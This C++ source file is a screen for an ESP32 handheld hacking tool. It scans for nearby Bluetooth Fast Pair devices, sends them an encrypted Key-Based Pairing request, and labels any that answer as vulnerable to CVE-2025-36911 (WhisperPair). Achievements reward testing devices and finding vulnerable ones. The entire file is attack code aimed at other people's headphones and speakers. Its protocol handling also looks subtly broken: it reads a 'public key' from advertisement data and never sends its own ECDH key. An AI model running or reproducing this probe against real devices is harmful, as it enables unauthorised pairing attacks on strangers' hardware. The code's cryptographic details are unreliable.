#include "WhisperPairScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/ble/BLEMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include <mbedtls/aes.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/ecdh.h>
#include <mbedtls/entropy.h>
#include <esp_random.h>

// Fast Pair GATT UUIDs (CVE-2025-36911 WhisperPair)
static const char* kFpServiceUUID = "0000fe2c-0000-1000-8000-00805f9b34fb";
static const char* kKbpCharUUID   = "fe2c1234-8366-4814-8eb0-01de32100bea";

// Shared notification flag — set by BLE task, read in main loop
static volatile bool s_notifReceived = false;

static void _fpNotifyCb(NimBLERemoteCharacteristic*, uint8_t*, size_t, bool)
{
  s_notifReceived = true;
}

// ── Lifecycle ──────────────────────────────────────────────────────────────

WhisperPairScreen::~WhisperPairScreen()
{
  if (_bleScan) {
    _bleScan->stop();
    NimBLEDevice::deinit(true);
    _bleScan = nullptr;
  }
}

void WhisperPairScreen::onInit()
{
  NimBLEDevice::init("");
  _bleScan = NimBLEDevice::getScan();
  _startScan();
}

void WhisperPairScreen::onUpdate()
{
  if (_state == STATE_TESTING) {
    if (_testPending) {
      _testPending = false;
      _runTest();
    }
    return;
  }

  if (_state == STATE_RESULT) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
        _showList();
      }
    }
    return;
  }

  // STATE_LIST — let ListScreen handle navigation
  ListScreen::onUpdate();
}

void WhisperPairScreen::onItemSelected(uint8_t index)
{
  if (_state != STATE_LIST || !_hasFpDevices) return;
  if (index >= _devCount) return;

  _selScanIdx  = _scanIdx[index];
  _state       = STATE_TESTING;
  _testPending = true;
  _log.clear();
  _log.addLine("Device:");
  _log.addLine(_devSub[index].c_str());
  render();
}

void WhisperPairScreen::onRender()
{
  if (_state == STATE_TESTING || _state == STATE_RESULT) {
    _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH());
    return;
  }
  ListScreen::onRender();
}

void WhisperPairScreen::onBack()
{
  if (_state == STATE_TESTING || _state == STATE_RESULT) {
    _showList();
    return;
  }
  NimBLEDevice::deinit(true);
  _bleScan = nullptr;
  Screen.goBack();
}

// ── Private ────────────────────────────────────────────────────────────────

void WhisperPairScreen::_startScan()
{
  _state = STATE_SCAN;
  ShowStatusAction::show("Scanning FP...", 0);
  _bleScan->clearResults();
  _scanResults = _bleScan->start(5, false);

  int n = Achievement.inc("whisper_scan_first");
  if (n == 1) Achievement.unlock("whisper_scan_first");

  _showList();
}

void WhisperPairScreen::_showList()
{
  _state        = STATE_LIST;
  _devCount     = 0;
  _hasFpDevices = false;
  NimBLEUUID fpUUID((uint16_t)0xFE2C);

  int total = (int)_scanResults.getCount();
  for (int i = 0; i < total && _devCount < kMaxDevices; i++) {
    NimBLEAdvertisedDevice dev = _scanResults.getDevice(i);
    if (!dev.isAdvertisingService(fpUUID)) continue;

    _scanIdx[_devCount]  = (uint8_t)i;
    _devLabel[_devCount] = dev.getAddress().toString().c_str();
    String name          = dev.getName().c_str();
    _devSub[_devCount]   = name.length() > 0 ? name : "Unknown";
    _devItems[_devCount] = {_devLabel[_devCount].c_str(), _devSub[_devCount].c_str()};
    _devCount++;
    _hasFpDevices = true;
  }

  if (_devCount == 0) {
    _devLabel[0] = "No FP devices";
    _devItems[0] = {_devLabel[0].c_str()};
    _devCount    = 1;
  }

  setItems(_devItems, _devCount);
}

void WhisperPairScreen::_runTest()
{
  NimBLEAdvertisedDevice dev = _scanResults.getDevice(_selScanIdx);
  _isVulnerable = _doKbpTest(dev);

  int nt = Achievement.inc("whisper_tested_5");
  if (nt == 5) Achievement.unlock("whisper_tested_5");
  if (_isVulnerable) {
    int nv = Achievement.inc("whisper_vulnerable");
    if (nv == 1) Achievement.unlock("whisper_vulnerable");
  }

  _state = STATE_RESULT;
  _log.addLine(_isVulnerable ? ">> VULNERABLE <<" : ">> Safe <<");
#ifdef DEVICE_HAS_KEYBOARD
  _log.addLine("ENTER/BACK: Back");
#else
  _log.addLine("Press: Back");
#endif
  render();
  if (Uni.Speaker) Uni.Speaker->beep();
}

bool WhisperPairScreen::_doKbpTest(NimBLEAdvertisedDevice dev)
{
  _log.addLine("Connecting...");
  render();

  NimBLEClient* pClient = NimBLEDevice::createClient();
  pClient->setConnectTimeout(5);

  if (!pClient->connect(dev.getAddress())) {
    _log.addLine("Connect failed");
    render();
    NimBLEDevice::deleteClient(pClient);
    return false;
  }
  _log.addLine("Connected");
  render();

  // Locate Fast Pair GATT service
  NimBLERemoteService* pSvc = pClient->getService(NimBLEUUID(kFpServiceUUID));
  if (!pSvc) {
    _log.addLine("No FP service");
    render();
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
  }

  // Locate KBP characteristic
  NimBLERemoteCharacteristic* pChar = pSvc->getCharacteristic(NimBLEUUID(kKbpCharUUID));
  if (!pChar) {
    _log.addLine("No KBP char");
    render();
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
  }

  // ── Extract peer public key ────────────────────────────────────────────
  uint8_t peerKey[64] = {0};
  bool    hasKey      = false;

  // Attempt 1: read 64-byte public key from GATT characteristic
  if (pChar->canRead()) {
    std::string val = pChar->readValue();
    if (val.size() == 64) {
      memcpy(peerKey, val.data(), 64);
      hasKey = true;
      _log.addLine("Key: GATT read");
      render();
    }
  }

  // Attempt 2: extract from Fast Pair service data (3 model-ID + 64 key bytes)
  if (!hasKey) {
    for (int i = 0; i < dev.getServiceDataCount(); i++) {
      std::string svcData = dev.getServiceData(i);
      if (svcData.size() >= 67) {
        memcpy(peerKey, svcData.data() + 3, 64);
        hasKey = true;
        _log.addLine("Key: Ad data");
        render();
        break;
      }
    }
  }

  if (!hasKey) {
    _log.addLine("Key: none");
    render();
  }

  // ── ECDH shared secret → AES-128 key ──────────────────────────────────
  uint8_t aesKey[16];
  _deriveAesKey(peerKey, hasKey, aesKey);
  _log.addLine("ECDH done");
  render();

  // ── Build KBP request packet (16 bytes) ───────────────────────────────
  // [0]    Type  0x00 = KBP request
  // [1]    Flags 0x00 = seeker initiates
  // [2-7]  Provider MAC (own ESP32 address)
  // [8-15] Random salt
  uint8_t plaintext[16] = {0};
  plaintext[0] = 0x00;
  plaintext[1] = 0x00;
  const uint8_t* ownMac = NimBLEDevice::getAddress().getNative();
  memcpy(&plaintext[2], ownMac, 6);
  esp_fill_random(&plaintext[8], 8);

  uint8_t ciphertext[16];
  _encryptAes(plaintext, ciphertext, aesKey);

  // ── Subscribe for notification before writing ──────────────────────────
  s_notifReceived = false;
  if (pChar->canNotify()) {
    pChar->subscribe(true, _fpNotifyCb);
  }

  // ── Send encrypted KBP packet ──────────────────────────────────────────
  _log.addLine("Sending KBP...");
  render();

  bool writeOk = pChar->writeValue(ciphertext, 16, true);
  if (!writeOk) {
    _log.addLine("Write failed");
    render();
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
  }

  // ── Wait up to 2 s for pairing notification ───────────────────────────
  uint32_t start = millis();
  while (!s_notifReceived && millis() - start < 2000) {
    delay(50);
  }

  bool vulnerable = s_notifReceived;
  _log.addLine(vulnerable ? "Notif: YES" : "Notif: NO");
  render();

  pClient->disconnect();
  NimBLEDevice::deleteClient(pClient);
  return vulnerable;
}

void WhisperPairScreen::_deriveAesKey(const uint8_t* peerKey, bool hasKey, uint8_t* aesKey)
{
  if (!hasKey) {
    esp_fill_random(aesKey, 16);
    return;
  }

  mbedtls_entropy_context  entropy;
  mbedtls_ctr_drbg_context ctrDrbg;
  mbedtls_ecp_group        grp;
  mbedtls_mpi              d, z;
  mbedtls_ecp_point        Q, Qp;

  mbedtls_entropy_init(&entropy);
  mbedtls_ctr_drbg_init(&ctrDrbg);
  mbedtls_ecp_group_init(&grp);
  mbedtls_mpi_init(&d);
  mbedtls_mpi_init(&z);
  mbedtls_ecp_point_init(&Q);
  mbedtls_ecp_point_init(&Qp);

  static const char* kPers = "wp_kbp";
  mbedtls_ctr_drbg_seed(&ctrDrbg, mbedtls_entropy_func, &entropy,
                         (const uint8_t*)kPers, strlen(kPers));

  mbedtls_ecp_group_load(&grp, MBEDTLS_ECP_DP_SECP256R1);
  mbedtls_ecp_gen_keypair(&grp, &d, &Q, mbedtls_ctr_drbg_random, &ctrDrbg);

  // Reconstruct uncompressed peer public key: 0x04 || X(32) || Y(32)
  uint8_t peerFull[65];
  peerFull[0] = 0x04;
  memcpy(peerFull + 1, peerKey, 64);

  bool ok = (mbedtls_ecp_point_read_binary(&grp, &Qp, peerFull, 65) == 0);
  if (ok) {
    uint8_t shared[32];
    ok = (mbedtls_ecdh_compute_shared(&grp, &z, &Qp, &d,
                                      mbedtls_ctr_drbg_random, &ctrDrbg) == 0);
    if (ok) {
      mbedtls_mpi_write_binary(&z, shared, 32);
      memcpy(aesKey, shared, 16);  // first 16 bytes as AES-128 key
    }
  }

  if (!ok) {
    esp_fill_random(aesKey, 16);
  }

  mbedtls_ecp_point_free(&Qp);
  mbedtls_ecp_point_free(&Q);
  mbedtls_mpi_free(&z);
  mbedtls_mpi_free(&d);
  mbedtls_ecp_group_free(&grp);
  mbedtls_ctr_drbg_free(&ctrDrbg);
  mbedtls_entropy_free(&entropy);
}

void WhisperPairScreen::_encryptAes(const uint8_t* plaintext, uint8_t* ciphertext, const uint8_t* key)
{
  mbedtls_aes_context aes;
  mbedtls_aes_init(&aes);
  mbedtls_aes_setkey_enc(&aes, key, 128);
  mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, plaintext, ciphertext);
  mbedtls_aes_free(&aes);
}